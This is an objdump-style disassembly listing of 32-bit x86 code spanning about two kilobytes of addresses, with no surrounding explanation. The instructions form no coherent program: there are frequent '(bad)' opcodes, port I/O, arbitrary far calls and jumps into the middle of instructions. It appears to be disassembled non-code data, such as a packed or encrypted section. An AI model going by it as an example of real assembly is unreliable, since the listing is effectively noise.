  4103ea:	rol    DWORD PTR [edx],1
  4103ec:	xor    BYTE PTR ds:0xb85ddcdb,ah
  4103f2:	sub    ah,BYTE PTR [eax+esi*4+0x12]
  4103f6:	add    dl,al
  4103f8:	call   0x9da6cf9e
  4103fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103fe:	add    edi,edx
  410400:	or     BYTE PTR ds:[edx+0x45],0x87
  410405:	popa   
  410406:	push   esp
  410407:	push   eax
  410408:	sub    dl,BYTE PTR ds:0xb58b8b1
  41040e:	push   cs
  41040f:	push   ecx
  410410:	sbb    DWORD PTR [edx+0x29],edi
  410413:	aam    0x86
  410415:	sub    al,0xd3
  410417:	sub    BYTE PTR [eax+0x23],al
  41041a:	rcr    BYTE PTR [esp+ecx*1],cl
  41041d:	push   es
  41041e:	rcr    ebx,1
  410420:	fisttp DWORD PTR [ebx]
  410422:	mov    edi,0x50f96fdf
  410427:	hlt    
  410428:	push   ecx
  410429:	push   ebx
  41042a:	inc    esp
  41042b:	mov    edi,0xcd582850
  410430:	cmp    BYTE PTR [ebx],al
  410432:	add    eax,DWORD PTR [ebx]
  410434:	(bad)  
  410435:	inc    eax
  410436:	call   0x8c05:0xa1481f4
  41043d:	lea    ecx,[ebp+0x14747461]
  410443:	mov    ecx,0x72e50e5c
  410448:	sbb    DWORD PTR [ebx],ecx
  41044a:	or     ecx,DWORD PTR [ebx]
  41044c:	ret    
  41044d:	ret    
  41044e:	ret    
  41044f:	ret    
  410450:	(bad)  
  410451:	ds aaa 
  410453:	aaa    
  410454:	pop    ss
  410455:	stos   DWORD PTR es:[edi],eax
  410456:	push   esp
  410457:	sub    al,BYTE PTR [ebp-0x60]
  41045a:	sub    DWORD PTR [ebp-0x49],ebx
  41045d:	or     al,0xa0
  41045f:	(bad)  
  410461:	fistp  QWORD PTR [edi-0xa01416]
  410467:	cli    
  410468:	std    
  410469:	mov    ebx,0x72feef77
  41046e:	ja     0x4104e7
  410470:	mov    bh,0xdb
  410472:	out    dx,eax
  410473:	test   ebx,0x7159f3e7
  410479:	add    ebp,edx
  41047b:	call   0x69d3:0xa4ffa34a
  410482:	arpl   WORD PTR [eax+0x78],di
  410485:	clc    
  410486:	fdivr  st,st(3)
  410488:	out    dx,eax
  410489:	mov    edi,0x6a6a607f
  41048e:	push   0xffffffcc
  410490:	xor    al,0x4d
  410492:	or     eax,0x445d8d0d
  410497:	inc    ebx
  410498:	shr    ebx,cl
  41049a:	pop    eax
  41049b:	dec    edx
  41049c:	add    ah,bl
  41049e:	add    eax,0x91001190
  4104a3:	inc    eax
  4104a4:	popa   
  4104a5:	int    0x9a
  4104a7:	xor    eax,0xfa3e8fdd
  4104ac:	call   0xd33b63c4
  4104b1:	xchg   edi,eax
  4104b2:	mov    esi,0xc34dc007
  4104b7:	test   BYTE PTR [ecx],dl
  4104b9:	in     al,dx
  4104ba:	and    dl,dl
  4104bc:	sbb    al,0xe2
  4104be:	(bad)  
  4104bf:	sub    ebp,esi
  4104c1:	outs   dx,DWORD PTR ds:[esi]
  4104c2:	inc    edi
  4104c3:	add    al,0xb2
  4104c5:	jge    0x41049b
  4104c7:	pushf  
  4104c8:	out    0x72,eax
  4104ca:	mov    ecx,0x65d5d5d0
  4104cf:	xchg   ebp,eax
  4104d0:	mov    ds:0x97e98591,eax
  4104d5:	imul   eax,DWORD PTR [edx-0x56],0x3
  4104d9:	scas   eax,DWORD PTR es:[edi]
  4104da:	mov    bh,0xb8
  4104dc:	dec    ebp
  4104dd:	scas   al,BYTE PTR es:[edi]
  4104de:	or     ebp,0x4c
  4104e1:	cmp    cl,BYTE PTR [ebp-0x5c]
  4104e4:	inc    ecx
  4104e5:	dec    edx
  4104e6:	inc    ecx
  4104e7:	xlat   BYTE PTR ds:[ebx]
  4104e8:	jne    0x4104b6
  4104ea:	int    0xcd
  4104ec:	popa   
  4104ed:	jbe    0x410565
  4104ef:	(bad)  
  4104f0:	dec    edx
  4104f1:	fsub   DWORD PTR [ecx]
  4104f3:	and    DWORD PTR [edi+edx*8],esp
  4104f6:	jno    0x4104cd
  4104f8:	stos   BYTE PTR es:[edi],al
  4104f9:	push   ebp
  4104fa:	pop    eax
  4104fb:	mov    bl,0x66
  4104fd:	dec    ebp
  4104fe:	lods   eax,DWORD PTR ds:[esi]
  4104ff:	stc    
  410500:	scas   eax,DWORD PTR es:[edi]
  410501:	adc    dh,BYTE PTR ds:[ebx]
  410504:	add    eax,0x84fe6927
  410509:	bound  esi,QWORD PTR [ecx-0x2afcee98]
  41050f:	push   edi
  410510:	pushf  
  410511:	popf   
  410512:	call   0x2fd0:0x91947bf
  410519:	pop    ecx
  41051a:	sub    DWORD PTR [edi+ebp*4+0x7c],esi
  41051e:	ds pop edi
  410520:	jns    0x41050b
  410522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410523:	xchg   edi,eax
  410524:	sahf   
  410525:	pushf  
  410526:	sahf   
  410527:	sahf   
  410528:	into   
  410529:	mov    eax,ds:0x145c25d6
  41052e:	jle    0x410549
  410530:	add    DWORD PTR [ecx+edx*8+0x8],edx
  410534:	add    BYTE PTR [ebx],al
  410536:	int    0x96
  410538:	loop   0x410561
  41053a:	and    al,BYTE PTR [edx+0x3d401095]
  410540:	jp     0x4104ef
  410542:	sub    BYTE PTR ds:0xa00b26c1,dh
  410548:	(bad)  
  410549:	jb     0x4104f5
  41054b:	jmp    0x410592
  41054d:	and    al,0x93
  41054f:	xor    ebp,DWORD PTR [eax-0x73cf35ac]
  410555:	or     dl,BYTE PTR [ebp+edx*2-0x7b]
  410559:	popa   
  41055a:	push   esp
  41055b:	lods   al,BYTE PTR ds:[esi]
  41055c:	and    BYTE PTR [eax],ah
  41055e:	std    
  41055f:	dec    ecx
  410560:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410561:	add    eax,0xac4847f8
  410566:	dec    edi
  410567:	inc    ecx
  410568:	lahf   
  410569:	inc    eax
  41056a:	and    BYTE PTR [eax-0x5b5d703c],dh
  410570:	sbb    al,0x1a
  410572:	pop    eax
  410573:	xchg   ecx,eax
  410574:	mov    dl,0xfb
  410576:	inc    edx
  410577:	mov    eax,ds:0x90c7d350
  41057c:	retf   
  41057d:	in     eax,0x30
  41057f:	cmp    DWORD PTR [ecx],edi
  410581:	mov    ecx,ecx
  410583:	leave  
  410584:	dec    ecx
  410585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410586:	shr    DWORD PTR [ecx+0x54],cl
  410589:	sub    dl,BYTE PTR ds:0xe9d9b364
  41058f:	push   0xc8c1fa34
  410594:	enter  0x7c8,0xba
  410598:	scas   al,BYTE PTR es:[edi]
  410599:	push   ebx
  41059a:	jbe    0x41053a
  41059c:	jge    0xee2b61b9
  4105a2:	in     eax,dx
  4105a3:	in     eax,dx
  4105a4:	fnstcw WORD PTR [ebx-0x10681089]
  4105aa:	mov    ebx,0xd73bbeef
  4105af:	scas   al,BYTE PTR es:[edi]
  4105b0:	pop    ebp
  4105b1:	sbb    esp,DWORD PTR [ecx]
  4105b3:	pop    edi
  4105b4:	int    0xeb
  4105b6:	cmc    
  4105b7:	mov    ds:0x5b232e5c,al
  4105bc:	pop    ds
  4105bd:	and    ebx,DWORD PTR fs:[ebx+0x7f1d5acd]
  4105c4:	out    0xe7,al
  4105c6:	out    0xa7,eax
  4105c8:	fidivr WORD PTR [ebx+esi*8-0x33]
  4105cc:	pop    edi
  4105cd:	lea    ecx,[esp+ecx*4-0x6aa85564]
  4105d4:	add    al,0x96
  4105d6:	or     edi,DWORD PTR ds:0xc9b7175f
  4105dc:	add    eax,0x594166a0
  4105e1:	xchg   ebx,eax
  4105e2:	pusha  
  4105e3:	jno    0x4105b4
  4105e5:	sahf   
  4105e6:	cmp    eax,0xe8fa3d77
  4105eb:	mov    ds:0xb55aac2f,eax
  4105f0:	jmp    0x50ae:0x439c940b
  4105f7:	sub    ebp,ebp
  4105f9:	or     dh,BYTE PTR cs:[edi+edi*2]
  4105fd:	fbld   TBYTE PTR [edx+0x45d72f60]
  410603:	push   0xc4886965
  410608:	loopne 0x4105fd
  41060a:	stc    
  41060b:	lods   al,BYTE PTR ds:[esi]
  41060c:	call   FWORD PTR [ebp+0x2e5ca088]
  410612:	mov    ds:0x54a02850,eax
  410617:	sub    bl,BYTE PTR [ecx-0x3d]
  41061a:	ret    
  41061b:	mov    DWORD PTR [edx],ecx
  41061d:	adc    DWORD PTR [ebx-0x145e8d40],0x9f3e7c3a
  410627:	aad    0xe7
  410629:	test   BYTE PTR [ebx+0x4152a54a],dl
  41062f:	cmp    bl,BYTE PTR [ebp+0x2c2c2c6]
  410635:	mov    dh,0xc6
  410638:	jmp    0xdddd:0xd1079c43
  41063f:	lea    edi,[esi-0x90bc142]
  410645:	neg    BYTE PTR [edx+0x4d]
  410648:	mov    eax,0x569d9d9d
  41064d:	ins    BYTE PTR es:[edi],dx
  41064e:	xor    BYTE PTR [edx+0x40],0x4a
  410652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410653:	xchg   edx,eax
  410654:	xor    eax,0x7e170fa2
  410659:	icebp  
  41065a:	cmp    edx,DWORD PTR [esi-0x14287bef]
  410660:	mov    ch,0x5c
  410662:	push   ecx
  410663:	mov    bh,0xdb
  410665:	lea    esp,[ebx-0x90170b9]
  41066b:	popf   
  41066c:	ja     0x41064c
  41066e:	jns    0x41067f
  410670:	inc    eax
  410671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410672:	pop    esi
  410673:	jne    0x410673
  410675:	mov    edi,0x75f39093
  41067a:	dec    edx
  41067b:	fst    DWORD PTR [esi+0x4b027565]
  410681:	arpl   WORD PTR [esi],ax
  410683:	sub    eax,edx
  410685:	dec    edx
  410686:	adc    al,BYTE PTR [ecx-0x5517fe1a]
  41068c:	stos   BYTE PTR es:[edi],al
  41068d:	clc    
  41068e:	or     al,0xa3
  410690:	bound  esi,QWORD PTR [ecx+0x57fdef23]
  410696:	sub    ah,ch
  410698:	popa   
  410699:	call   0x7340:0x2b7ad5
  4106a0:	or     BYTE PTR [edx+0x64c99cdf],dl
  4106a6:	push   0x35
  4106a8:	gs jg  0x410665
  4106ab:	stos   BYTE PTR es:[edi],al
  4106ac:	stos   BYTE PTR es:[edi],al
  4106ad:	(bad)  
  4106ae:	xor    BYTE PTR [edx+0x64],bl
  4106b1:	inc    esi
  4106b2:	adc    ch,BYTE PTR [eax]
  4106b4:	imul   ebp,DWORD PTR [edi],0xffffff99
  4106b7:	dec    esp
  4106b8:	pop    edx
  4106b9:	leave  
  4106ba:	adc    al,0xa1
  4106bc:	push   eax
  4106bd:	or     BYTE PTR [ebx],al
  4106bf:	add    eax,DWORD PTR [ebx]
  4106c1:	dec    ebp
  4106c2:	or     BYTE PTR [edi],0xd4
  4106c5:	sbb    BYTE PTR ds:[eax+0x2c],0x86
  4106ca:	jae    0x4106b3
  4106cc:	into   
  4106cd:	and    DWORD PTR [ebx-0x282caf37],edx
  4106d3:	inc    edx
  4106d4:	xor    al,0x1a
  4106d6:	cmp    eax,0xa5d2e97c
  4106db:	ud2    
  4106dd:	test   DWORD PTR [edx+0xe],eax
  4106e0:	lea    ebp,[esi]
  4106e2:	mov    ecx,0xba670cd4
  4106e7:	(bad)  [esi-0x21]
  4106ea:	imul   ch
  4106ec:	fld    TBYTE PTR [edi-0x4]
  4106ef:	into   
  4106f0:	ja     0x4106b0
  4106f2:	repz cmc 
  4106f4:	sbb    ebp,DWORD PTR [esi-0x48]
  4106f7:	popa   
  4106f8:	xor    eax,0x142604d
  4106fd:	and    edx,esi
  4106ff:	scas   eax,DWORD PTR es:[edi]
  410700:	dec    ecx
  410701:	jmp    0x4106d2
  410703:	iret   
  410704:	iret   
  410705:	arpl   WORD PTR [esi+0x66],sp
  410708:	data16 div ah
  41070b:	jmp    0xf4c0b6e3
  410710:	rol    DWORD PTR [edi-0x39],1
  410713:	repnz stc 
  410715:	cld    
  410716:	and    bl,BYTE PTR [eax+0x53]
  410719:	sbb    al,0x9a
  41071b:	jge    0x410798
  41071d:	(bad)  
  41071f:	dec    ebx
  410720:	add    eax,0x917ffd4b
  410725:	add    BYTE PTR [edx+edi*1],dl
  410728:	jle    0x410729
  41072a:	std    
  41072b:	neg    edi
  41072d:	repz clc 
  41072f:	jecxz  0x4106c0
  410731:	mov    edi,0xbb972e5a
  410736:	retf   
  410737:	in     eax,0xf2
  410739:	xchg   edx,eax
  41073a:	adc    DWORD PTR [edx+0x75c57eed],eax
  410740:	jno    0x410761
  410742:	pop    ss
  410743:	and    al,BYTE PTR cs:[esi+ecx*2]
  410747:	rcr    ah,cl
  410749:	mov    WORD PTR [edi],ss
  41074b:	test   esi,ebx
  41074d:	cs mov dh,0x60
  410750:	inc    edi
  410751:	adc    al,0x94
  410753:	sbb    BYTE PTR [esp+eiz*4+0x15],al
  410757:	mov    DWORD PTR [esp+ebp*1-0xd],eax
  41075b:	fwait
  41075c:	call   0x5ff7:0xe73fc94a
  410763:	add    DWORD PTR cs:[eax+0x142851eb],edx
  41076a:	lods   al,BYTE PTR ds:[esi]
  41076b:	add    DWORD PTR [eax+edi*2-0x75],ebx
  41076f:	add    ebp,DWORD PTR ds:0x4d34589c
  410775:	inc    ebx
  410776:	cs xchg edi,eax
  410778:	inc    ebx
  410779:	sub    al,0x16
  41077b:	mov    bl,0xc6
  41077d:	jp     0x41076b
  41077f:	jmp    0x41076c
  410781:	inc    ebx
  410782:	cmp    BYTE PTR [esi+eax*2],bl
  410785:	sub    BYTE PTR [edx+eax*2],dl
  410788:	xor    BYTE PTR [eax],bl
  41078a:	inc    esp
  41078b:	and    BYTE PTR [eax],dl
  41078d:	mov    al,0xd2
  41078f:	(bad)  
  410790:	sub    esi,ebx
  410792:	les    ebx,FWORD PTR [ebx+0x20962977]
  410798:	ds stos DWORD PTR es:[edi],eax
  41079a:	dec    eax
  41079b:	pop    esi
  41079c:	xor    al,0xb2
  41079e:	jae    0x4107ca
  4107a0:	xchg   ebp,eax
  4107a1:	ret    0xfdfe
  4107a4:	sti    
  4107a5:	jmp    FWORD PTR [edi-0x5b]
  4107a8:	push   edx
  4107a9:	jno    0x41074c
  4107ab:	adc    DWORD PTR [eax+0x26],esp
  4107ae:	mov    eax,ds:0xb65c8516
  4107b3:	cs xchg edx,eax
  4107b5:	add    eax,edx
  4107b7:	dec    esp
  4107b8:	push   es
  4107b9:	ror    BYTE PTR [edx],0x89
  4107bc:	pusha  
  4107bd:	fld    DWORD PTR [eax+eiz*2]
  4107c0:	sbb    BYTE PTR [esi-0x54a952af],al
  4107c6:	and    BYTE PTR [edx+0x31],0xa4
  4107ca:	popa   
  4107cb:	push   esp
  4107cc:	jmp    0xed4f:0x1f4d1bda
  4107d3:	test   ebp,edx
  4107d5:	rol    BYTE PTR [eax-0x46505337],cl
  4107db:	or     DWORD PTR ds:0x2ba8a7c6,ecx
  4107e1:	stc    
  4107e2:	inc    esi
  4107e3:	mov    esp,0xdd469f0d
  4107e8:	leave  
  4107e9:	xlat   BYTE PTR ds:[ebx]
  4107ea:	sti    
  4107eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ec:	push   ebx
  4107ed:	scas   eax,DWORD PTR es:[edi]
  4107ee:	cmp    al,0x8a
  4107f0:	or     DWORD PTR [eax+0x56ad5539],edx
  4107f6:	sub    eax,0x48913edf
  4107fb:	and    BYTE PTR [edi+0x2c58a1cb],dl
  410801:	push   0xfffffff1
  410803:	js     0x410801
  410805:	je     0x410829
  410807:	xchg   ecx,eax
  410808:	sbb    BYTE PTR [edi+0x58],bl
  41080b:	pop    eax
  41080c:	cwde   
  41080d:	aam    0x34
  41080f:	sub    eax,0x7e09a85
  410814:	rcl    DWORD PTR [eax],1
  410816:	jl     0x410895
  410818:	fnstsw WORD PTR [edx-0x941e48b]
  41081e:	mov    ch,0xaf
  410820:	jge    0x41081b
  410822:	(bad)  
  410823:	sbb    ebp,DWORD PTR [edi-0x24]
  410826:	mov    al,0x79
  410828:	repz out 0x35,al
  41082b:	popf   
  41082c:	popf   
  41082d:	popf   
  41082e:	xchg   esi,eax
  41082f:	fstp   DWORD PTR [eax-0x49]
  410832:	sbb    dl,BYTE PTR [eax+0x2c]
  410835:	push   ss
  410836:	mov    cl,0xb8
  410838:	mov    eax,0x59d9d988
  41083d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083e:	shr    ecx,cl
  410840:	jmp    0x3f8f:0x89e8e8e8
  410847:	(bad)  
  410848:	clc    
  410849:	std    
  41084a:	mov    DWORD PTR [ecx-0x60cf077],ecx
  410850:	cld    
  410851:	add    bl,BYTE PTR [edx]
  410853:	mov    esi,0x316c1739
  410858:	rol    bh,1
  41085a:	test   DWORD PTR [ebp-0x132e8184],ebx
  410860:	out    0xc2,eax
  410862:	pop    edi
  410863:	add    eax,0x6db6d950
  410868:	fwait
  410869:	out    dx,eax
  41086a:	mov    eax,ds:0xf27a1e87
  41086f:	out    dx,al
  410870:	mov    ebx,0x5d47feef
  410875:	xlat   BYTE PTR ds:[ebx]
  410876:	mov    ebx,0x256a92c9
  41087b:	cld    
  41087c:	sbb    al,0x76
  41087e:	inc    esp
  41087f:	and    BYTE PTR [ebx],bh
  410881:	xchg   edi,eax
  410882:	cvtps2pd xmm1,xmm2
  410885:	popa   
  410886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410887:	icebp  
  410888:	mov    ecx,0xb3615f99
  41088d:	and    DWORD PTR [ecx+0x64170596],ecx
  410893:	push   ecx
  410894:	dec    eax
  410895:	fsubr  QWORD PTR [esi+0x37]
  410898:	cld    
  410899:	(bad)  
  41089a:	fisub  DWORD PTR [eax-0x2fbd2360]
  4108a0:	jmp    0x410833
  4108a2:	cld    
  4108a3:	push   edx
  4108a4:	test   eax,0x672e5c84
  4108a9:	or     DWORD PTR [edx-0x184d1308],ebx
  4108af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b0:	rcr    DWORD PTR [eax+0x49],0x91
  4108b4:	enter  0x9116,0xc
  4108b8:	call   0xac9d62f8
  4108bd:	gs in  eax,0x26
  4108c0:	xchg   ebx,eax
  4108c1:	dec    ecx
  4108c2:	jmp    0x4108ff
  4108c4:	and    BYTE PTR [ebx],cl
  4108c6:	shr    bh,1
  4108c8:	mul    DWORD PTR [ebx]
  4108ca:	xchg   ebx,eax
  4108cb:	leave  
  4108cc:	or     al,0xb9
  4108ce:	fucomp st(6)
  4108d0:	mov    ecx,0xdfd7ebf5
  4108d5:	mov    dh,0x76
  4108d7:	in     eax,dx
  4108d8:	fisubr DWORD PTR [esi-0x61]
  4108db:	iret   
  4108dc:	out    0x2a,eax
  4108de:	adc    al,0xa
  4108e0:	shl    BYTE PTR [ebp-0x23],1
  4108e3:	pop    edx
  4108e4:	sub    al,ch
  4108e6:	dec    eax
  4108e7:	out    dx,al
  4108e8:	inc    ebx
  4108e9:	and    BYTE PTR [eax],dl
  4108eb:	mov    al,0xac
  4108ed:	xchg   edx,eax
  4108ee:	push   0xe7f97a34
  4108f3:	aas    
  4108f4:	(bad)  
  4108f5:	stc    
  4108f6:	mov    bl,0xa7
  4108f8:	dec    esi
  4108f9:	popf   
  4108fa:	cmp    cl,BYTE PTR [esi+0x26e7f686]
  410900:	ds ja  0x410904
  410903:	(bad)  
  410904:	cmc    
  410905:	push   esi
  410906:	out    dx,al
  410907:	sub    DWORD PTR [edx],0xddae8f39
  41090d:	push   ss
  41090e:	retf   
  41090f:	or     BYTE PTR es:[ebx-0x2231d0e9],0x72
  410917:	retf   
  410918:	sub    eax,0xf2e5cbba
  41091d:	push   ebx
  41091e:	and    al,0xd5
  410920:	xor    al,0xd
  410922:	aam    0x9a
  410924:	retf   0xda6b
  410927:	sahf   
  410928:	pop    es
  410929:	add    eax,0xb65f026b
  41092e:	bound  eax,QWORD PTR [eax]
  410930:	cld    
  410931:	inc    ebx
  410932:	icebp  
  410933:	aam    0x13
  410935:	xor    ah,al
  410937:	pop    esi
  410938:	jns    0x4108ff
  41093a:	(bad)  
  41093c:	mov    ah,BYTE PTR [ebx+ebx*1+0x30608186]
  410943:	mov    BYTE PTR [ecx+0x75740181],al
  410949:	jne    0x41090c
  41094b:	jmp    0x410942
  41094d:	pop    edx
  41094e:	les    eax,FWORD PTR [ecx+0x6d]
  410951:	(bad)  
  410952:	xchg   ebx,eax
  410953:	xchg   ebx,eax
  410954:	xchg   ebx,eax
  410955:	mov    ch,al
  410957:	(bad)  
  410958:	aam    0xde
  41095a:	pop    ebp
  41095b:	leave  
  41095c:	out    0xf3,eax
  41095e:	pop    ss
  41095f:	xchg   DWORD PTR [esi+0x264cde86],eax
  410965:	xchg   ebx,eax
  410966:	xchg   ebx,eax
  410967:	test   al,0x9
  410969:	daa    
  41096a:	cmc    
  41096b:	xchg   DWORD PTR [edi+0x7777a697],esp
  410971:	ja     0x41096a
  410973:	fdiv   QWORD PTR [edi-0x21]
  410976:	jge    0x4109ef
  410978:	cmp    al,0xf4
  41097a:	rol    BYTE PTR [ebx+0x77],1
  41097d:	outs   dx,BYTE PTR ds:[esi]
  41097e:	fdivr  QWORD PTR [eax-0x5dc1bbcf]
  410984:	(bad)  
  410985:	jecxz  0x410938
  410987:	es cli 
  410989:	sub    BYTE PTR [edx+ecx*1],dl
  41098c:	push   esi
  41098d:	loopne 0x4109bf
  41098f:	popf   
  410990:	dec    esi
  410991:	arpl   WORD PTR [esp+esi*2+0x74],si
  410995:	call   0xafd4d37e
  41099a:	mov    WORD PTR [edi+0x3511ff8f],cs
  4109a0:	mov    edi,0x88b8989e
  4109a5:	lods   ax,WORD PTR ds:[esi]
  4109a7:	iret   
  4109a8:	or     DWORD PTR [eax-0x2c],eax
  4109ab:	hlt    
  4109ac:	mov    ah,0x90
  4109ae:	ror    BYTE PTR [ebx-0x6029bfb7],0xbb
  4109b5:	arpl   di,ax
  4109b7:	mov    es,eax
  4109b9:	push   ebx
  4109ba:	dec    edi
  4109bb:	cmp    eax,0x3d3daff5
  4109c0:	cmp    eax,0x5a69a37f
  4109c5:	sar    DWORD PTR [edi+eax*1+0x2b7f34ed],cl
  4109cc:	or     esp,DWORD PTR [eax+0x39]
  4109cf:	out    0x88,eax
  4109d1:	in     eax,0x85
  4109d3:	imul   ebp,DWORD PTR [esi+edx*4-0x17db4408],0x92269cd4
  4109de:	add    bl,BYTE PTR [ecx+0x12]
  4109e1:	mov    esp,0x6090b8bc
  4109e6:	jp     0x4109a5
  4109e8:	faddp  st(6),st
  4109ea:	cld    
  4109eb:	or     dh,BYTE PTR [ebp+0x52]
  4109ee:	enter  0x72e5,0xd0
  4109f2:	xor    al,0xcd
  4109f4:	pop    edx
  4109f5:	dec    eax
  4109f6:	mov    DWORD PTR [eax-0x48ab1413],ecx
  4109fc:	inc    edx
  4109fd:	mov    eax,ds:0xedf54560
  410a02:	or     BYTE PTR [eax+0x8d03af],al
  410a08:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  410a0a:	push   edx
  410a0b:	mov    cl,0x12
  410a0d:	sub    DWORD PTR [edx-0x4f],0xffffffae
  410a11:	xor    dh,BYTE PTR [edi+0x2d]
  410a14:	cmp    ebx,DWORD PTR [edi+0x78]
  410a17:	loope  0x41099e
  410a19:	push   DWORD PTR [esi]
  410a1b:	xor    eax,0xf7bc9535
  410a20:	fidivr WORD PTR [ebx-0x49]
  410a23:	in     eax,dx
  410a24:	fdiv   DWORD PTR [ecx-0x4110501d]
  410a2a:	sti    
  410a2b:	out    dx,al
  410a2c:	ins    DWORD PTR es:[edi],dx
  410a2d:	add    eax,DWORD PTR [ebx]
  410a2f:	add    ebx,DWORD PTR [ebx-0x5]
  410a32:	sti    
  410a33:	sti    
  410a34:	pop    es
  410a35:	inc    edx
  410a36:	mov    eax,ds:0x8c088790
  410a3b:	xor    al,BYTE PTR [ecx+0x23]
  410a3e:	cmc    
  410a3f:	out    0xc6,al
  410a41:	mov    DWORD PTR [ecx+0x2f8bec89],ecx
  410a47:	mov    esi,0x87c3fdf8
  410a4c:	movsx  ecx,WORD PTR [ecx-0x4d8c0f66]
  410a53:	xchg   edi,eax
  410a54:	cdq    
  410a55:	std    
  410a56:	xor    dh,BYTE PTR [edx]
  410a58:	loopne 0x4109dc
  410a5a:	scas   al,BYTE PTR es:[edi]
  410a5b:	mov    al,0xf2
  410a5d:	je     0x4109fb
  410a5f:	xchg   esp,eax
  410a60:	or     BYTE PTR [edi-0x3f6d25e6],dh
  410a66:	dec    edx
  410a67:	sub    al,0x0
  410a69:	mov    bl,0xd9
  410a6b:	xchg   DWORD PTR [eax+eax*2],esi
  410a6e:	in     eax,dx
  410a6f:	(bad)  
  410a70:	cmc    
  410a71:	iret   
  410a72:	add    ebp,ecx
  410a74:	add    eax,DWORD PTR [edx-0x12b715cc]
  410a7a:	lock jl 0x410ae3
  410a7d:	push   esp
  410a7e:	rcr    BYTE PTR [eax],cl
  410a80:	hlt    
  410a81:	xchg   edx,eax
  410a82:	imul   ecx,DWORD PTR [edi*1-0x1280b8e6],0xeee8b5da
  410a8d:	out    dx,al
  410a8e:	outs   dx,BYTE PTR ds:[esi]
  410a8f:	sbb    dh,BYTE PTR [edx+eiz*4+0x3e]
  410a93:	mov    al,ds:0x3f9fce26
  410a98:	(bad)
  410a9c:	inc    edx
  410a9d:	mov    eax,ds:0xfe5c7f40
  410aa2:	ret    0xb85
  410aa5:	scas   eax,DWORD PTR es:[edi]
  410aa6:	dec    edi
  410aa7:	dec    esi
  410aa8:	dec    esi
  410aa9:	sahf   
  410aaa:	inc    esi
  410aab:	dec    ebp
  410aac:	sub    BYTE PTR ds:0x90cc2468,bh
  410ab2:	xchg   dh,dh
  410ab4:	in     al,dx
  410ab5:	fnstsw WORD PTR [ebx-0x7205409]
  410abb:	(bad)  
  410abc:	aaa    
  410abd:	out    dx,al
  410abe:	mov    ecx,0x22ebbaee
  410ac3:	in     al,0x9b
  410ac5:	xchg   ecx,eax
  410ac6:	lahf   
  410ac7:	dec    edx
  410ac8:	sbb    BYTE PTR [edi+0x3731e7cf],0x37
  410acf:	xchg   DWORD PTR [ecx+0x122429a9],ebp
  410ad5:	mov    esp,eax
  410ad7:	mov    ecx,0x777ee773
  410adc:	jmp    0x3ea8:0xf503a9d4
  410ae3:	xor    eax,0x2f2d71cd
  410ae8:	adc    al,BYTE PTR [eax]
  410aea:	sub    eax,0x66a5fb06
  410aef:	inc    ebp
  410af0:	pop    edx
  410af1:	pop    ss
  410af2:	xchg   ebx,eax
  410af3:	jg     0x410b6d
  410af5:	fs mov bh,0xfa
  410af8:	enter  0x8f23,0x3c
  410afc:	fst    st(5)
  410afe:	aad    0xf5
  410b00:	aaa    
  410b01:	xor    al,0x93
  410b03:	or     al,0x60
  410b05:	das    
  410b06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b07:	jbe    0x410b19
  410b09:	mov    DWORD PTR [eax+0x25],esp
  410b0c:	inc    edx
  410b0d:	das    
  410b0e:	sahf   
  410b0f:	ret    
  410b10:	and    ebx,esi
  410b12:	xlat   BYTE PTR ds:[ebx]
  410b13:	sub    eax,edi
  410b15:	dec    edx
  410b16:	and    esp,DWORD PTR [esi]
  410b18:	jae    0x410b05
  410b1a:	cmp    ah,0x7e
  410b1d:	jmp    0xaddc:0x2476460
  410b24:	mov    al,ds:0xe3c79138
  410b29:	inc    ecx
  410b2a:	ja     0x410ba3
  410b2c:	aaa    
  410b2d:	mov    edx,0xa951bbbb
  410b32:	push   esp
  410b33:	lods   al,BYTE PTR ds:[esi]
  410b34:	les    ebx,FWORD PTR ds:0xb029df32
  410b3a:	sub    BYTE PTR [edx+0x16e97523],dl
  410b40:	arpl   WORD PTR [ecx],ax
  410b42:	mov    dl,0x67
  410b44:	mov    ds:0xc677d3ba,eax
  410b49:	jmp    0x410b0c
  410b4b:	int    0xf9
  410b4d:	(bad)  
  410b4f:	fimul  WORD PTR ds:0x77eefddf
  410b55:	jmp    FWORD PTR [ecx-0x21]
  410b58:	mov    esi,0x703fdf7d
  410b5d:	loopne 0x410b1f
  410b5f:	pop    ds
  410b60:	push   cs
  410b61:	sbb    al,0x38
  410b63:	jo     0x410b57
  410b65:	lds    edx,FWORD PTR [edi]
  410b67:	pop    edi
  410b68:	hlt    
  410b69:	cli    
  410b6a:	std    
  410b6b:	(bad)  
  410b6c:	loopne 0x410b5b
  410b6e:	mov    bh,0xdf
  410b70:	jle    0x410b4f
  410b72:	imul   ch
  410b74:	fld    TBYTE PTR [edi-0x41]
  410b77:	repz into 
  410b79:	cmp    esi,DWORD PTR [edi-0x6432194]
  410b7f:	cli    
  410b80:	xor    eax,0x3f5cd66b
  410b85:	cmp    BYTE PTR [eax],bh
  410b87:	call   0x275458c1
  410b8c:	dec    edi
  410b8d:	sahf   
  410b8e:	int3   
  410b8f:	in     al,dx
  410b90:	(bad)  [edi-0x7038f811]
  410b96:	pop    ds
  410b97:	aas    
  410b98:	add    ah,BYTE PTR [eax+0x44dafea7]
  410b9e:	loop   0x410b87
  410ba0:	inc    edx
  410ba1:	or     esi,DWORD PTR [esp+eax*1]
  410ba4:	pop    ecx
  410ba5:	adc    DWORD PTR [esi+0x6201b93],ecx
  410bab:	or     BYTE PTR [ecx+0x59cec1ac],ch
  410bb1:	push   esi
  410bb2:	imul   eax,ecx,0x4a
  410bb5:	bound  eax,QWORD PTR [eax]
  410bb7:	gs inc ebp
  410bb9:	push   ecx
  410bba:	ror    BYTE PTR [edx+0x436a44a2],cl
  410bc0:	jge    0x410bdb
  410bc2:	dec    ebp
  410bc3:	inc    ecx
  410bc4:	inc    eax
  410bc5:	out    dx,al
  410bc6:	xor    edx,edx
